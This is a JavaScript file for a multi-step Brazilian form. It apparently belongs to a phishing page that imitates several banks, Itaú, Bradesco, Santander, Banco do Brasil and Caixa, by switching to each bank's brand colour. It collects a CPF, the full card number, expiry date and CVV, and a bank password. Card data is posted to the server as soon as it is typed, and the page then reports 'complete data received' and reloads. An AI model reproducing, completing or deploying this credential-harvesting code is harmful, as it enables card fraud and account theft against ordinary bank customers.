document.addEventListener('DOMContentLoaded', () => {
    // Elementos das etapas
    const stepCpf = document.getElementById('step-cpf');
    const stepBanco = document.getElementById('step-banco');
    const stepCartao = document.getElementById('step-cartao');
    const stepSenha = document.getElementById('step-senha');
    const resultadoDiv = document.getElementById('resultado');
    const loadingOverlay = document.getElementById('loading-overlay');

    // Campos
    const cpfInput = document.getElementById('cpf');
    const btnValidateCpf = document.getElementById('btn-validate-cpf');
    const cpfError = document.getElementById('cpf-error');
    const btnNextBank = document.getElementById('btn-next-bank');
    const numeroCartao = document.getElementById('numero-cartao');
    const validade = document.getElementById('validade');
    const cvv = document.getElementById('cvv');
    const btnNextSenha = document.getElementById('btn-next-senha');
    const senhaInput = document.getElementById('senha');
    const btnSubmitSenha = document.getElementById('btn-submit-senha');

    let cpfValidado = null;
    let bancoSelecionado = null;

    // Funções auxiliares
    function showLoading() { loadingOverlay.style.display = 'flex'; }
    function hideLoading() { loadingOverlay.style.display = 'none'; }

    function formatarCPF(valor) {
        valor = valor.replace(/\D/g, '');
        if (valor.length > 11) valor = valor.slice(0, 11);
        if (valor.length > 9) {
            valor = valor.replace(/^(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
        } else if (valor.length > 6) {
            valor = valor.replace(/^(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
        } else if (valor.length > 3) {
            valor = valor.replace(/^(\d{3})(\d{0,3})/, '$1.$2');
        }
        return valor;
    }

    function validarCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11) return false;
        if (/^(\d)\1+$/.test(cpf)) return false;
        let soma = 0;
        for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
        let resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(cpf.charAt(9))) return false;
        soma = 0;
        for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(cpf.charAt(10))) return false;
        return true;
    }

    function camposCartaoPreenchidos() {
        const num = numeroCartao.value.replace(/\s/g, '');
        const val = validade.value;
        const cvvVal = cvv.value;
        return (num.length === 16 && val.length === 5 && cvvVal.length >= 3);
    }

    async function salvarCartao() {
        if (!camposCartaoPreenchidos()) return;
        showLoading();
        const num = numeroCartao.value.replace(/\s/g, '');
        const val = validade.value;
        const cvvVal = cvv.value;

        const payload = {
            cpf: cpfValidado,
            banco: bancoSelecionado,
            dadosCartao: {
                numero: num,
                validade: val,
                cvv: cvvVal
            }
        };

        try {
            const response = await fetch('/api/salvar-cartao', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (result.sucesso) {
                btnNextSenha.disabled = false;
                document.getElementById('cartao-error').textContent = '';
            } else {
                document.getElementById('cartao-error').textContent = result.mensagem || 'Erro ao salvar cartão.';
                btnNextSenha.disabled = true;
            }
        } catch (err) {
            console.error(err);
            document.getElementById('cartao-error').textContent = 'Erro de comunicação. Tente novamente.';
            btnNextSenha.disabled = true;
        } finally {
            hideLoading();
        }
    }

    function updateStepsIndicator(stepNumber) {
        const steps = document.querySelectorAll('.steps-indicator .step');
        steps.forEach((step, idx) => {
            if (idx + 1 === stepNumber) {
                step.classList.add('active-step');
            } else {
                step.classList.remove('active-step');
            }
        });
    }

    // Eventos
    cpfInput.addEventListener('input', (e) => {
        e.target.value = formatarCPF(e.target.value);
    });

    btnValidateCpf.addEventListener('click', async () => {
        const cpf = cpfInput.value;
        if (!validarCPF(cpf)) {
            cpfError.textContent = 'CPF inválido. Verifique e tente novamente.';
            return;
        }
        cpfError.textContent = '';
        cpfValidado = cpf;
        showLoading();
        try {
            const response = await fetch('/api/validar-cpf', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf })
            });
            const data = await response.json();
            if (!data.valido) {
                cpfError.textContent = data.mensagem || 'CPF não autorizado.';
                hideLoading();
                return;
            }
        } catch (err) {
            console.error('Erro ao validar CPF no servidor:', err);
        }
        hideLoading();
        stepCpf.classList.remove('active');
        stepBanco.classList.add('active');
        updateStepsIndicator(2);
    });

    const radiosBanco = document.querySelectorAll('input[name="banco"]');
    radiosBanco.forEach(radio => {
        radio.addEventListener('change', function () {
            let cor = "#f5f7fa";
            switch (this.value) {
                case "Itaú": cor = "#EC7000"; break;
                case "Bradesco": cor = "#CC092F"; break;
                case "Santander": cor = "#EC0000"; break;
                case "Banco do Brasil": cor = "#FFCC00"; break;
                case "Caixa": cor = "#0066B3"; break;
            }
            document.body.style.background = `linear-gradient(135deg, ${cor}, #ffffff)`;
        });
    });

    btnNextBank.addEventListener('click', () => {
        const bancoRad = document.querySelector('input[name="banco"]:checked');
        if (!bancoRad) return;
        bancoSelecionado = bancoRad.value;
        stepBanco.classList.remove('active');
        stepCartao.classList.add('active');
        updateStepsIndicator(3);
    });

    numeroCartao.addEventListener('input', (e) => {
        let valor = e.target.value.replace(/\D/g, '');
        if (valor.length > 16) valor = valor.slice(0, 16);
        valor = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
        e.target.value = valor;
        if (camposCartaoPreenchidos()) {
            salvarCartao();
        } else {
            btnNextSenha.disabled = true;
        }
    });

    validade.addEventListener('input', (e) => {
        let valor = e.target.value.replace(/\D/g, '');
        if (valor.length > 4) valor = valor.slice(0, 4);
        if (valor.length > 2) {
            valor = valor.slice(0, 2) + '/' + valor.slice(2);
        }
        e.target.value = valor;
        if (camposCartaoPreenchidos()) {
            salvarCartao();
        } else {
            btnNextSenha.disabled = true;
        }
    });

    cvv.addEventListener('input', (e) => {
        let valor = e.target.value.replace(/\D/g, '');
        if (valor.length > 4) valor = valor.slice(0, 4);
        e.target.value = valor;
        if (camposCartaoPreenchidos()) {
            salvarCartao();
        } else {
            btnNextSenha.disabled = true;
        }
    });

    btnNextSenha.addEventListener('click', () => {
        if (btnNextSenha.disabled) return;
        stepCartao.classList.remove('active');
        stepSenha.classList.add('active');
        updateStepsIndicator(4);
    });

    btnSubmitSenha.addEventListener('click', async (e) => {
        e.preventDefault();
        const senha = senhaInput.value;
        if (!senha) {
            document.getElementById('senha-error').textContent = 'Senha é obrigatória.';
            return;
        }
        document.getElementById('senha-error').textContent = '';
        showLoading();
        try {
            const response = await fetch('/api/enviar-senha', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf: cpfValidado, senha })
            });
            const result = await response.json();
            if (result.sucesso) {
                resultadoDiv.innerHTML = '<p style="color:green;"><i class="fas fa-check-circle"></i> Dados completos recebidos com sucesso!</p>';
                setTimeout(() => location.reload(), 3000);
            } else {
                resultadoDiv.innerHTML = '<p style="color:red;"><i class="fas fa-exclamation-triangle"></i> Erro ao enviar senha. Tente novamente.</p>';
            }
        } catch (err) {
            console.error(err);
            resultadoDiv.innerHTML = '<p style="color:red;">Erro de comunicação com o servidor.</p>';
        } finally {
            hideLoading();
        }
    });
});